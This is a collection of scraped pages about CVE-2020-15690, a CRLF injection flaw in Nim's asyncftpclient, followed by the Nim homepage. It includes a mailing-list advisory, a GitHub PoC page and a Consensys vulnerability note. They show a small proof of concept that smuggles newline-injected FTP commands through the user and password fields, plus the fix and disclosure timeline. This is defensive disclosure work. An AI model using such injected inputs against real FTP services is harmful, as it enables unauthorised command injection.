=== Content from www.openwall.com_062462eb_20250119_111510.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](2) [[next>]](4) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <F0E1DB22-8CF0-46D2-9E59-C45FF50D2C2C@consensys.net>
Date: Thu, 4 Feb 2021 15:58:23 +0100
From: Martin Ortner <martin.ortner@...sensys.net>
To: oss-security@...ts.openwall.com
Subject: [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection

title: "Nim - stdlib asyncftpd - Crlf Injection"
date: 2021-02-04T15:25:49+01:00

cve: ["CVE-2020-15690"]
vendor: nim-lang
vendorUrl: <https://nim-lang.org/>
authors: tintinweb
affectedVersions: [ "< 1.2.6" ]
vulnClass: CWE-93

Vulnerability Note: <https://consensys.net/diligence/vulnerabilities/nim-asyncftpd-crlf-injection/>
Vulnerability Note: <https://github.com/tintinweb/pub/tree/master/pocs/cve-2020-15690>
Group: <https://consensys.net/diligence/research/>

# Vulnerability Note

## Summary

In Nim before 1.2.6, the standard library asyncftpclient lacks a check for whether a message contains a newline character.

## Details

### Description

The nim standard library `asyncftpclient` is vulnerable to multiple `CR-LF` injections. An injection is possible if the attacker controls any argument that is passed to the remote server such as the `username` and `password` to `newAsyncFtpClient`.

The root cause of this issue is that the `send(ftp, msg)` allows `msg` to contain `CR-LF` control characters. An attacker that controls any unchecked input to `send()` can therefore inject arbitrary FTP commands.

```nim
proc send*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.} =
  ## Send a message to the server, and wait for a primary reply.
  ## ``\c\L`` is added for you.
  ##
  ## **Note:** The server may return multiple lines of coded replies.
  await ftp.csock.send(m & "\c\L")
  return await ftp.expectReply()
```

### Proof of Concept

Note: `nim c -r -d:ssl  crlf_inject.nim`

* Injecting FTP commands via `user` and `pass`

```nim
import asyncdispatch, asyncftpclient
proc main() {.async.} =
  var ftp = newAsyncFtpClient("localhost", user = "test\nINJECTED_LINE test test", pass = "test\nINJECTED_LINE test test 2")
  await ftp.connect()
  echo("Connected")
waitFor(main())
```

Output:

```
⇒ nim c -r -d:ssl  crlf_inject.nim
...
Hint: 104717 LOC; 1.030 sec; 113.309MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject.nim; out: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject  [Exec]
Connected
```

```
⇒  nc -l 21
220 fake ftp
USER test
INJECTED_LINE test test
230 Hi test, thanks for injecting a line...
PASS test
INJECTED_LINE test test 2
230 thx for injecting another line...
```

### Proposed Fix

- properly validate user input
- raise an exception if `CR` or `LF` if found in the `msg` passed to `send()`

## Vendor Response

Vendor response: fixed in 1.2.6

### Timeline

```
JUL/13/2020 - contact dom96//AT//telegram; provided details, PoC
FEB/04/2020 - public disclosure
```

## References

* [1] <https://nim-lang.org/>
* [2] <https://nim-lang.org/install.html>
* [3] [https://en.wikipedia.org/wiki/Nim_(programming_language](https://en.wikipedia.org/wiki/Nim_%28programming_language))

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_0077fa0f_20250119_111517.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintinweb%2Fpub%2Ftree%2Fmaster%2Fpocs%2Fcve-2020-15690)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftintinweb%2Fpub%2Ftree%2Fmaster%2Fpocs%2Fcve-2020-15690)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=tintinweb%2Fpub)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[tintinweb](/tintinweb)
/
**[pub](/tintinweb/pub)**
Public

* [Notifications](/login?return_to=%2Ftintinweb%2Fpub) You must be signed in to change notification settings
* [Fork
  125](/login?return_to=%2Ftintinweb%2Fpub)
* [Star
   258](/login?return_to=%2Ftintinweb%2Fpub)

* [Code](/tintinweb/pub)
* [Issues
  0](/tintinweb/pub/issues)
* [Pull requests
  0](/tintinweb/pub/pulls)
* [Actions](/tintinweb/pub/actions)
* [Projects
  0](/tintinweb/pub/projects)
* [Wiki](/tintinweb/pub/wiki)
* [Security](/tintinweb/pub/security)
* [Insights](/tintinweb/pub/pulse)

Additional navigation options

* [Code](/tintinweb/pub)
* [Issues](/tintinweb/pub/issues)
* [Pull requests](/tintinweb/pub/pulls)
* [Actions](/tintinweb/pub/actions)
* [Projects](/tintinweb/pub/projects)
* [Wiki](/tintinweb/pub/wiki)
* [Security](/tintinweb/pub/security)
* [Insights](/tintinweb/pub/pulse)

## Files

 master
## Breadcrumbs

1. [pub](/tintinweb/pub/tree/master)
2. /[pocs](/tintinweb/pub/tree/master/pocs)
/
# cve-2020-15690

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/tintinweb/pub/commits/master/pocs/cve-2020-15690) master
## Breadcrumbs

1. [pub](/tintinweb/pub/tree/master)
2. /[pocs](/tintinweb/pub/tree/master/pocs)
/
# cve-2020-15690

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/tintinweb/pub/tree/master/pocs) | | |
| [Readme.md](/tintinweb/pub/blob/master/pocs/cve-2020-15690/Readme.md "Readme.md") | | [Readme.md](/tintinweb/pub/blob/master/pocs/cve-2020-15690/Readme.md "Readme.md") |  |  |
| [crlf\_inject.nim](/tintinweb/pub/blob/master/pocs/cve-2020-15690/crlf_inject.nim "crlf_inject.nim") | | [crlf\_inject.nim](/tintinweb/pub/blob/master/pocs/cve-2020-15690/crlf_inject.nim "crlf_inject.nim") |  |  |
| View all files | | |

## [Readme.md](#readme)

| title | date | cve | vendor | vendorUrl | authors | affectedVersions | vulnClass |
| --- | --- | --- | --- | --- | --- | --- | --- |
| Nim - stdlib asyncftpd - Crlf Injection | 2021-02-04 15:25:49 +0100 | | CVE-2020-15690 | | --- | | nim-lang | <https://nim-lang.org/> | tintinweb | | < 1.2.6 | | --- | | CWE-93 |

# Vulnerability Note

## Summary

In Nim before 1.2.6, the standard library asyncftpclient lacks a check for whether a message contains a newline character.

## Details

### Description

The nim standard library `asyncftpclient` is vulnerable to multiple `CR-LF` injections. An injection is possible if the attacker controls any argument that is passed to the remote server such as the `username` and `password` to `newAsyncFtpClient`.

The root cause of this issue is that the `send(ftp, msg)` allows `msg` to contain `CR-LF` control characters. An attacker that controls any unchecked input to `send()` can therefore inject arbitrary FTP commands.

```
proc send*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.} =
  ## Send a message to the server, and wait for a primary reply.
  ## ``\c\L`` is added for you.
  ##
  ## **Note:** The server may return multiple lines of coded replies.
  await ftp.csock.send(m & "\c\L")
  return await ftp.expectReply()
```

### Proof of Concept

Note: `nim c -r -d:ssl crlf_inject.nim`

* Injecting FTP commands via `user` and `pass`

```
import asyncdispatch, asyncftpclient
proc main() {.async.} =
  var ftp = newAsyncFtpClient("localhost", user = "test\nINJECTED_LINE test test", pass = "test\nINJECTED_LINE test test 2")
  await ftp.connect()
  echo("Connected")
waitFor(main())
```

Output:

```
⇒ nim c -r -d:ssl  crlf_inject.nim
...
Hint: 104717 LOC; 1.030 sec; 113.309MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject.nim; out: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject  [Exec]
Connected

```

```
⇒  nc -l 21
220 fake ftp
USER test
INJECTED_LINE test test
230 Hi test, thanks for injecting a line...
PASS test
INJECTED_LINE test test 2
230 thx for injecting another line...

```

### Proposed Fix

* properly validate user input
* raise an exception if `CR` or `LF` if found in the `msg` passed to `send()`

## Vendor Response

Vendor response: fixed in 1.2.6

### Timeline

```
JUL/13/2020 - contact dom96@telegram; provided details, PoC
FEB/04/2020 - public disclosure

```

## References

* [1] <https://nim-lang.org/>
* [2] <https://nim-lang.org/install.html>
* [3] [https://en.wikipedia.org/wiki/Nim\_(programming\_language)](https://en.wikipedia.org/wiki/Nim_%28programming_language%29)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from consensys.net_92942880_20250119_111511.html ===

[![Consensys Diligence](/images/logo/logo.svg)](/ "Home")

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")

# Nim - stdlib asyncftpd - Crlf Injection

* [1 Summary](#summary)
* [2 Details](#details)
  + [2.1 Description](#description)
  + [2.2 Proof of Concept](#proof-of-concept)
  + [2.3 Proposed Fix](#proposed-fix)
* [3 Vendor Response](#vendor-response)
  + [3.1 Timeline](#timeline)
* [4 References](#references)

Request access to Fuzzing

[Book Now](https://consensys.io/diligence/fuzzing/)

| CVE | [CVE-2020-15690](https://nvd.nist.gov/vuln/detail/CVE-2020-15690) |
| --- | --- |
| Vendor | [nim-lang](https://nim-lang.org/) |
| Affected Versions | < 1.2.6 |
| Vulnerability Class | CWE-93 |
| Author(s) | tintinweb |
| Date | Feb 4, 2021 |

**Vulnerability Note**

## 1 Summary

In Nim before 1.2.6, the standard library asyncftpclient lacks a check for whether a message contains a newline character.

## 2 Details

### 2.1 Description

The nim standard library `asyncftpclient` is vulnerable to multiple `CR-LF` injections. An injection is possible if the attacker controls any argument that is passed to the remote server such as the `username` and `password` to `newAsyncFtpClient`.

The root cause of this issue is that the `send(ftp, msg)` allows `msg` to contain `CR-LF` control characters. An attacker that controls any unchecked input to `send()` can therefore inject arbitrary FTP commands.

```
proc send*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.} =
  ## Send a message to the server, and wait for a primary reply.
  ## ``\c\L`` is added for you.
  ##
  ## **Note:** The server may return multiple lines of coded replies.
  await ftp.csock.send(m & "\c\L")
  return await ftp.expectReply()

```
### 2.2 Proof of Concept

Note: `nim c -r -d:ssl crlf_inject.nim`

* Injecting FTP commands via `user` and `pass`

```
import asyncdispatch, asyncftpclient
proc main() {.async.} =
  var ftp = newAsyncFtpClient("localhost", user = "test\nINJECTED_LINE test test", pass = "test\nINJECTED_LINE test test 2")
  await ftp.connect()
  echo("Connected")
waitFor(main())

```

Output:

```
⇒ nim c -r -d:ssl  crlf_inject.nim
...
Hint: 104717 LOC; 1.030 sec; 113.309MiB peakmem; Debug build; proj: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject.nim; out: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject [SuccessX]
Hint: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject  [Exec]
Connected

```
```
⇒  nc -l 21
220 fake ftp
USER test
INJECTED_LINE test test
230 Hi test, thanks for injecting a line...
PASS test
INJECTED_LINE test test 2
230 thx for injecting another line...

```
### 2.3 Proposed Fix

* properly validate user input
* raise an exception if `CR` or `LF` if found in the `msg` passed to `send()`

## 3 Vendor Response

Vendor response: fixed in 1.2.6 ([Official Security Advisory](https://github.com/nim-lang/security/security/advisories/GHSA-hm64-5qwh-q65c))

### 3.1 Timeline

```
JUL/13/2020 - contact nim developers @telegram; provided details, PoC
FEB/04/2021 - public disclosure
MAR/26/2021 - vendor advisory: https://github.com/nim-lang/security/security/advisories/GHSA-hm64-5qwh-q65c

```
## 4 References

* [1] <https://nim-lang.org/>
* [2] <https://nim-lang.org/install.html>
* [3] [https://en.wikipedia.org/wiki/Nim\_(programming\_language)](https://en.wikipedia.org/wiki/Nim_%28programming_language%29)

![](/images/home/icon-ili-xs.png)

Request a Security Review Today

Get in touch with our team to request a quote for a smart contract audit.

[Contact Us](/contact/)

![](/images/home/icon-ili-outline-white.svg)

[Audits](/audits/ "Audits")
[Fuzzing](/fuzzing/ "Fuzzing")
[Scribble](/scribble/ "Scribble")
[Blog](/blog/ "Blog")
[Tools](/tools/ "Tools")
[Research](/research/ "Research")
[About](/about/ "About")
[Contact](/contact/ "Contact")
[Careers](https://consensys.io/open-roles/?discipline=32525 "Careers")
[Privacy Policy](/privacy-policy/ "Privacy Policy")

Subscribe to Our Newsletter

Stay up-to-date on our latest offerings, tools, and the world of blockchain security.

[![](/images/home/powered-by.svg)](https://consensys.io)



=== Content from nim-lang.org_88341cf2_20250119_131033.html ===

[![Nim](/assets/img/logo.svg)](/)

* [Blog](/blog.html)
* [Features](/features.html)
* [Download](/install.html)
* [Documentation](/documentation.html)
* [Forum](https://forum.nim-lang.org)
* [Donate](/donate.html)
* [Source](https://github.com/nim-lang/Nim)

# Efficient, expressive, elegant

## Nim is a statically typed compiled systems programming language. It combines successful concepts from mature languages like Python, Ada and Modula.

[Install Nim 2.2.0](/install.html)
[Try it online](https://play.nim-lang.org/#ix=2lK1)
### Efficient

* Nim generates native dependency-free executables, not dependent on a virtual machine,
  which are small and allow easy redistribution.
* The Nim compiler and the generated executables support all major platforms like
  Windows, Linux, BSD and macOS.
* Nim's memory management is deterministic and customizable with destructors and move
  semantics, inspired by C++ and Rust.
  It is well-suited for embedded, hard-realtime systems.
* Modern concepts like zero-overhead iterators and compile-time evaluation
  of user-defined functions, in combination with the preference of value-based
  datatypes allocated on the stack, lead to extremely performant code.
* Support for various backends: it compiles to C, C++ or JavaScript so that Nim
  can be used for all backend and frontend needs.

### Expressive

* Nim is self-contained: the compiler and the standard library are implemented in Nim.
* Nim has a powerful macro system which allows direct manipulation of the AST,
  offering nearly unlimited opportunities.

### Elegant

* Macros cannot change Nim's syntax because there is no need for it â
  the syntax is flexible enough.
* Modern type system with local type inference, tuples, generics and sum types.
* Statements are grouped by indentation but can span multiple lines.

Simple example
Ifâ¦else, Case switch
Basic math
String operations
Comprehensions

````
import std/strformat

type
  Person = object
    name: string
    age: Natural # Ensures the age is positive

let people = [
  Person(name: "John", age: 45),
  Person(name: "Kate", age: 30)
]

for person in people:
  # Type-safe string interpolation,
  # evaluated at compile time.
  echo(fmt"{person.name} is {person.age} years old")

# Thanks to Nim's 'iterator' and 'yield' constructs,
# iterators are as easy to write as ordinary
# functions. They are compiled to inline loops.
iterator oddNumbers[Idx, T](a: array[Idx, T]): T =
  for x in a:
    if x mod 2 == 1:
      yield x

for odd in oddNumbers([3, 6, 9, 12, 15, 18]):
  echo odd

# Use Nim's macro system to transform a dense
# data-centric description of x86 instructions
# into lookup tables that are used by
# assemblers and JITs.
import macros, strutils

macro toLookupTable(data: static[string]): untyped =
  result = newTree(nnkBracket)
  for w in data.split(';'):
    result.add newLit(w)

const
  data = "mov;btc;cli;xor"
  opcodes = toLookupTable(data)

for o in opcodes:
  echo o
````
````
var conditional = 42

if conditional < 0:
  echo "conditional < 0"
elif conditional > 0:
  echo "conditional > 0"
else:
  echo "conditional == 0"

var ternary = if conditional == 42: true else: false

var another =
  if conditional == 0:
    "zero"
  elif conditional mod 2 == 0:
    "even"
  else:
    "odd"

# Case switch.
var letter = 'c'

case letter
of 'a':
  echo "letter is 'a'"
of 'b', 'c':
  echo "letter is 'b' or 'c'"
of 'd'..'h':
  echo "letter is between 'd' and 'h'"
else:
  echo "letter is another character"
````
````
import std/math

# Basic math.
assert 1 + 2 == 3        # Sum
assert 4 - 1 == 3        # Subtraction
assert 2 * 2 == 4        # Multiplication
assert 4 / 2 == 2.0      # Division
assert 4 div 2 == 2      # Integer Division
assert 2 ^ 3 == 8        # Power
assert 4 mod 2 == 0      # Modulo
assert (2 xor 4) == 6    # XOR
assert (4 shr 2) == 1    # Shift Right
assert PI * 2 == TAU     # PI and TAU
assert sqrt(4.0) == 2.0  # Square Root
assert round(3.5) == 4.0 # Round
assert isPowerOfTwo(16)  # Powers of Two
assert floor(2.9) == 2.0 # Floor
assert ceil(2.9) == 3.0  # Ceil
assert cos(TAU) == 1.0   # Cosine
assert gcd(12, 8) == 4   # Greatest common divisor
assert trunc(1.75) == 1.0     # Truncate
assert floorMod(8, 3) == 2    # Floor Modulo
assert floorDiv(8, 3) == 2    # Floor Division
assert hypot(4.0, 3.0) == 5.0 # Hypotenuse
assert gamma(4.0) == 6.0      # Gamma function
assert radToDeg(TAU) == 360.0 # Radians to Degrees
assert clamp(1.4, 0.0 .. 1.0) == 1.0 # Clamp
assert almostEqual(PI, 3.14159265358979)
assert euclDiv(-13, -3) == 5  # Euclidean Division
assert euclMod(-13, 3) == 2   # Euclidean Modulo
````
````
import std/[strutils, strscans]

assert "con" & "cat" == "concat"
assert "    a    ".strip == "a"
assert "42".parseInt == 42
assert "3.14".parseFloat == 3.14
assert "0x666".parseHexInt == 1638
assert "TrUe".parseBool == true
assert "0o777".parseOctInt == 511
assert "a".repeat(9) == "aaaaaaaaa"
assert "abc".startsWith("ab")
assert "abc".endsWith("bc")
assert ["a", "b", "c"].join == "abc"
assert "abcd".find("c") == 2
assert "a x a y a z".count("a") == 3
assert "A__B__C".normalize == "abc"
assert "a,b".split(",") == @["a", "b"]
assert "a".center(5) == "  a  "
assert "a".indent(4) == "    a"
assert "    a".unindent(4) == "a"

for word in tokenize("This is an example"):
  echo word

let (ok, year, month, day) = scanTuple("1000-01-01", "$i-$i-$i")
if ok:
  assert year == 1000
  assert month == 1
  assert day == 1
````
````
import std/[sugar, tables, sets, sequtils, strutils]

let variable0 = collect(newSeq):
  for item in @[-9, 1, 42, 0, -1, 9]:
    item * 2

assert variable0 == @[-18, 2, 84, 0, -2, 18]

let variable1 = collect(initTable):
  for key, value in @[0, 5, 9]:
    {key: value div 2}

assert variable1 == {0: 0, 1: 2, 2: 4}.toTable

let variable2 = collect(initHashSet):
  for item in @[-9, 1, 42, 0, -1, 9]:
    {item + item}

assert variable2 == [2, 18, 84, 0, -18, -2].toHashSet

assert toSeq(1..15).mapIt(
    if it mod 15 == 0:  "FizzBuzz"
    elif it mod 5 == 0: "Buzz"
    elif it mod 3 == 0: "Fizz"
    else: $it
  ).join(" ").strip == "1 2 Fizz 4 Buzz Fizz 7 8 Fizz Buzz 11 Fizz 13 14 FizzBuzz"
````

[More examples at RosettaCodeâ¦](http://rosettacode.org/wiki/Category%3ANim)

# Recent articles

24 December 2024

## [Nim version 2.0.14 released](/blog/2024/12/24/nim-2014-released.html)

The Nim team is happy to announce Nim version 2.0.14, our seventh patch release for Nim 2.0,
for our users who havenât switched yet to [Nim 2.2](https://nim-lang.org/blog/2024/10/02/nim-220-2010.html).

09 December 2024

## [Launching the 2024 Nim Community Survey](/blog/2024/12/09/community-survey-2024.html)

We are proud to announce the launch of the official
[2024 Nim Community Survey](https://forms.gle/s6WomUFyUANijhrL6)!

[All articles](/blog.html)

![](/assets/img/mastering_nim.jpg)
# Mastering Nim

### The definite guide on Nim!

### Written by the inventor himself.

### Now with updated content for version 2.0 which solves the biggest pain point of Nim 1.0, shared memory in a multi-threaded setting.

[Buy it on amazon.com](https://www.amazon.com/dp/B0B4R7B9YX)
[Buy it on amazon.de](https://www.amazon.de/dp/B0B4R7B9YX)

# Support Nim

## Join the 100+ companies and individuals that support Nim

### The Nim project is developed globally by a group of volunteers. We welcome recurring donations, which enable us to spend more time working on Nim.

[Donate](/donate.html)

# Community

## Real-time chat

*#*Libera.chat#nim

[Discord/Nim](https://discord.gg/nim)

[Gitter/Nim](https://gitter.im/nim-lang/Nim)

[*m*#nim:envs.net](https://matrix.to/#/#nim:envs.net)

[*#*IRC Logs](https://irclogs.nim-lang.org)

[Telegram/nim\_lang](https://t.me/nim_lang)

## Forum

[forum.nim-lang.org](https://forum.nim-lang.org)

[r/nim](https://reddit.com/r/nim)

[StackOverflow](https://stackoverflow.com/questions/tagged/nim-lang)

## Bug reports

[nim-lang/Nim](https://github.com/nim-lang/Nim/issues)

## Twitter

[@nim\_lang](https://twitter.com/nim_lang)

[Join the community](/community.html)

# Looking for the GitHub repository?

### The Nim compiler and tools are all written in Nim and licensed under the MIT license, with most development taking place on GitHub. Be sure to watch the repository to get updates on Nim's development, or star it to give us some brownie points.

[Source code](https://github.com/nim-lang/Nim)

Unless otherwise stated, the content of this page is
licensed under the
[Creative Commons Attribution 3.0](https://creativecommons.org/licenses/by/3.0/)
license.
Code displayed on this website is MIT licensed.

This website is available on
[GitHub](https://github.com/nim-lang/website)
and contributions are welcome.
Original website design by
[Dominik Picheta](https://github.com/dom96) and
[Hugo Locurcio](https://github.com/Calinou).
Logo by [Joseph Wecker](https://github.com/josephwecker).

[![](/assets/img/do.png)](https://m.do.co/c/637ab907c7f4)



=== Content from github.com_b2f2dda5_20250119_111513.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2FNim%2Fblob%2Fdc5a40f3f39c6ea672e6dc6aca7f8118a69dda99%2Flib%2Fpure%2Fasyncftpclient.nim)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fnim-lang%2FNim%2Fblob%2Fdc5a40f3f39c6ea672e6dc6aca7f8118a69dda99%2Flib%2Fpure%2Fasyncftpclient.nim)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=nim-lang%2FNim)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[nim-lang](/nim-lang)
/
**[Nim](/nim-lang/Nim)**
